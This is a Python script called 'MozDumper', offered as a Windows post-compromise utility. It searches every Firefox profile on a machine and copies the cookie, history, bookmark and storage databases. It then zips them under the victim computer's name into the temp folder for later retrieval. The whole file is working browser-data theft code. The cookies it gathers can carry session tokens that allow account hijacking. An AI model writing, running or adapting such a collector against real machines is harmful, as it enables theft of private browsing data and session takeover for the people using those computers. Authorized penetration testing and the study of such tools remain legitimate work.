#!/usr/bin/env python
#                   ----------------------------------------
#                            MozDumper by gh0stxplt
#                   ----------------------------------------
#   This is a Windows post-compromise utility to dump data from Mozilla firefox APPDATA 
#   folders for each profile that exists on the machine. It will collect bookmarks, 
#   cookies, and url history that can be useful in further penetration test explotation.


from zipfile import ZipFile
import os
from os.path import basename
from os.path import expanduser
import base64
import shutil

#Array for files we want to extract
collectedFiles = []

#Define appdata/roaming location
ROAMINGDIR = os.environ['APPDATA']

#Get Computer Name
VICTIMCOMPUTER = os.environ['COMPUTERNAME']

#Define Mozilla directory
MOZDIR = ROAMINGDIR+'\Mozilla\Firefox\Profiles'

#Define sqlite files to look for
juicyfiles = ['bookmarks.sqlite','places.sqlite', 'storage.sqlite', 'cookies.sqlite']

TEMPDIR = os.getenv("TEMP")

banner = '''
      ___           ___           ___                         ___           ___           ___         ___           ___     
     /\  \         /\  \         /\__\         _____         /\  \         /\  \         /\  \       /\__\         /\  \    
    |::\  \       /::\  \       /::|  |       /::\  \        \:\  \       |::\  \       /::\  \     /:/ _/_       /::\  \   
    |:|:\  \     /:/\:\  \     /:/:|  |      /:/\:\  \        \:\  \      |:|:\  \     /:/\:\__\   /:/ /\__\     /:/\:\__\  
  __|:|\:\  \   /:/  \:\  \   /:/|:|  |__   /:/  \:\__\   ___  \:\  \   __|:|\:\  \   /:/ /:/  /  /:/ /:/ _/_   /:/ /:/  /  
 /::::|_\:\__\ /:/__/ \:\__\ /:/ |:| /\__\ /:/__/ \:|__| /\  \  \:\__\ /::::|_\:\__\ /:/_/:/  /  /:/_/:/ /\__\ /:/_/:/__/___
 \:\~~\  \/__/ \:\  \ /:/  / \/__|:|/:/  / \:\  \ /:/  / \:\  \ /:/  / \:\~~\  \/__/ \:\/:/  /   \:\/:/ /:/  / \:\/:::::/  /
  \:\  \        \:\  /:/  /      |:/:/  /   \:\  /:/  /   \:\  /:/  /   \:\  \        \::/__/     \::/_/:/  /   \::/~~/~~~~ 
   \:\  \        \:\/:/  /       |::/  /     \:\/:/  /     \:\/:/  /     \:\  \        \:\  \      \:\/:/  /     \:\~~\     
    \:\__\        \::/  /        |:/  /       \::/  /       \::/  /       \:\__\        \:\__\      \::/  /       \:\__\    
     \/__/         \/__/         |/__/         \/__/         \/__/         \/__/         \/__/       \/__/         \/__/    
'''
def main():
    print(banner)
    print('\nDumping mozilla data...')

    for path, directories, files in os.walk(MOZDIR):
        for file in files:
            if file in juicyfiles:
                juice = os.path.join(path, file)
                collectedFiles.append(juice)
                
    #Once all files are in our array, zip them up
    with ZipFile('{}_MOZDATA.zip'.format(VICTIMCOMPUTER), 'w') as zipObject:
        for x in collectedFiles:
            profile = x.split('\\')[8]
            arcname = profile + '_' + basename(x)
            zipObject.write(x, arcname)

    #Move zip to tempdir            
    dest = TEMPDIR + '{}_MOZDATA.zip'.format(VICTIMCOMPUTER)
    shutil.move('{}_MOZDATA.zip'.format(VICTIMCOMPUTER),dest)

    print('[+] Done! Look for file at {}\{}_MOZDATA.zip'.format(TEMPDIR,VICTIMCOMPUTER))
    
if __name__ == '__main__':
    main()